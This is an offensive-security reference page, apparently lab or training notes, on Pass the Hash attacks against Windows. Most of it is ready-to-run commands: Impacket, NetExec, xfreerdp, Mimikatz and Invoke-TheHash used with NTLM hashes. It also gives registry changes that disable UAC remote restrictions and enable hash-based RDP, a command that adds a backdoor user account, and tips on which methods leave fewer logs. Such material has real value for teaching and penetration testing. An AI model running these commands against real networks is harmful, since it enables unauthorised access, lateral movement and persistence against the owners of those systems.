---
title: "Pass the Hash (PtH)"
description: "Using NTLM hashes to authenticate without knowing the plaintext password for lateral movement in Windows."
tags:
  - password-attacks
  - lateral-movement
  - pass-the-hash
  - pth
  - ntlm
  - mimikatz
---

# 🔁 Pass the Hash (PtH)

**Pass the Hash (PtH)** is a lateral movement technique where an attacker authenticates to a remote system or service using a user's NTLM hash instead of their plaintext password.

This attack works because the NTLM authentication protocol does not actually transmit the plaintext password over the network; it transmits a response calculated using the NT hash. If you possess the NT hash, you can simply inject it into the authentication process.

---

## 1️⃣ Requirements for Pass the Hash

To successfully perform a PtH attack against a remote Windows machine, you need:

1. **A valid username and NT hash.** (e.g., `admin:8846f7eaee8fb117ad06bdd830b7586c`)
2. **SMB access** to the target machine (Port 445 open).
3. The user must have **Local Administrator** privileges on the target machine (due to UAC restrictions introduced in modern Windows, PtH generally fails for standard users unless specific registry keys are modified).

---

## 2️⃣ Performing PtH with Impacket

Impacket provides several scripts that execute code remotely using Pass the Hash. This is the most common and OPSEC-safe method from a Linux attack machine.

### `psexec.py`
Creates a remote service and uploads an executable to get a SYSTEM shell. (Loud, drops files to disk).
```bash
impacket-psexec -hashes :8846f7eaee8fb117ad06bdd830b7586c corp.local/admin@10.10.10.20
```

### `smbexec.py`
Creates a remote service that executes commands via `cmd.exe` and writes the output to a temporary file via SMB. (Does not drop binaries to disk, but creates a noisy service).
```bash
impacket-smbexec -hashes :8846f7eaee8fb117ad06bdd830b7586c corp.local/admin@10.10.10.20
```

### `wmiexec.py`
Uses Windows Management Instrumentation (WMI) to execute commands. (Very stealthy, leaves few logs, preferred method).
```bash
impacket-wmiexec -hashes :8846f7eaee8fb117ad06bdd830b7586c corp.local/admin@10.10.10.20
```

!!! note
    Notice the `-hashes :[NTHash]` syntax. The format is `LMHash:NTHash`. Since modern Windows uses blank LM hashes, you leave the LM portion empty but keep the colon.

---

## 3️⃣ Performing PtH with NetExec

NetExec (formerly CrackMapExec) is excellent for testing a hash across an entire subnet to find where it is valid.

```bash
# Test the hash against a single machine
netexec smb 10.10.10.20 -u admin -H 8846f7eaee8fb117ad06bdd830b7586c

# Test the hash against a /24 subnet and execute a command if successful
netexec smb 10.10.10.0/24 -u admin -H 8846f7eaee8fb117ad06bdd830b7586c -x "whoami"
```
Look for the `(Pwn3d!)` indicator, which confirms the hash works and grants Local Administrator access.

---

## 4️⃣ Performing PtH via RDP (Restricted Admin Mode)

By default, RDP requires a plaintext password. However, if **Restricted Admin Mode** is enabled on the target machine, you can RDP using only the NT hash.

If you already have a shell on the target machine (e.g., via WinRM or SMBExec) but want a full GUI session, you can enable Restricted Admin Mode by modifying the registry:

```cmd
# Enable Restricted Admin Mode
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```

Once enabled, you can connect using a PtH tool like `xfreerdp3` (the modern version of `xfreerdp` on Kali).

```bash
# Using xfreerdp from Linux
xfreerdp3 /u:admin /pth:8846f7eaee8fb117ad06bdd830b7586c /v:10.10.10.20
```

---

## 5️⃣ Performing PtH from Windows (Mimikatz)

If you are attacking from a compromised Windows machine (e.g., via an RDP session), you can use Mimikatz to inject the hash into a new process.

```cmd
# Requires local administrator privileges on the current machine
mimikatz # privilege::debug
mimikatz # sekurlsa::pth /user:admin /domain:corp.local /ntlm:8846f7eaee8fb117ad06bdd830b7586c /run:cmd.exe
```
This spawns a new `cmd.exe` window running in the context of `corp.local\admin`. Any network connections made from this window (e.g., `dir \\10.10.10.20\C$`) will automatically authenticate using the injected hash.

You can also run this as a one-liner directly from the command prompt (useful for scripting or C2 execution). The `/rc4` flag is simply an alias for `/ntlm`.
```cmd
mimikatz.exe privilege::debug "sekurlsa::pth /user:julio /rc4:64F12CDDAA88057E06A81B54E73B949B /domain:inlanefreight.htb /run:cmd.exe" exit
```

---

## 6️⃣ Performing PtH with Invoke-TheHash

[Invoke-TheHash](https://github.com/Kevin-Robertson/Invoke-TheHash) is a PowerShell suite designed for Pass the Hash attacks. It is extremely useful because it operates without requiring local administrative privileges on your attack machine (unlike Mimikatz). It contains multiple modules for executing commands via WMI or SMB.

### Invoke-TheHash with SMB (Invoke-SMBExec)
This module creates a remote service to execute commands, similar to Impacket's `smbexec.py`.

```powershell
# Import the module
Import-Module .\Invoke-TheHash.psd1

# Execute a command via SMB
Invoke-SMBExec -Target 10.10.10.20 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "net user attacker Password123! /add"
```

### Invoke-TheHash with WMI (Invoke-WMIExec)
This module uses WMI to execute commands, which is much stealthier than SMBExec as it doesn't create new services.

```powershell
Invoke-WMIExec -Target 10.10.10.20 -Domain inlanefreight.htb -Username julio -Hash 64F12CDDAA88057E06A81B54E73B949B -Command "powershell -e <base64_payload>"
```

---

## 7️⃣ UAC Restrictions (Local vs. Domain Accounts)

Modern Windows implements strict UAC (User Account Control) restrictions that impact Pass the Hash, specifically regarding *local* accounts.

- **Domain Accounts:** If you PtH with a Domain Admin or a domain user who is in the local Administrators group of the target machine, PtH works flawlessly. UAC does not restrict network logons for domain accounts.
- **Built-in Administrator (RID 500):** If you PtH using the built-in local `Administrator` account (RID 500), it works flawlessly. This account has a full access token by default.
- **Other Local Administrators:** If you PtH using a *custom* local administrator account (e.g., a local user named `ITAdmin`), PtH will successfully authenticate you, but UAC will strip your administrative token during the network logon. You will receive an `Access Denied` error when trying to access administrative shares (`C$`, `ADMIN$`) or execute code via WMI/SMBExec.

### The `LocalAccountTokenFilterPolicy` Bypass
The restriction on custom local administrators is controlled by a specific registry key. If the target machine has been configured with `LocalAccountTokenFilterPolicy` set to `1`, UAC remote restrictions are disabled.

```cmd
# The registry key that disables UAC for remote local admins:
HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1
```
If this key is set to 1, PtH will work for *any* local administrator account, not just the RID 500 account.

---

!!! warning
    **Pass the Hash relies on NTLM authentication.** If the target network enforces Kerberos and disables NTLM entirely, PtH attacks will fail. You must use [Pass the Ticket (PtT)](pass-the-ticket-windows.md) instead.
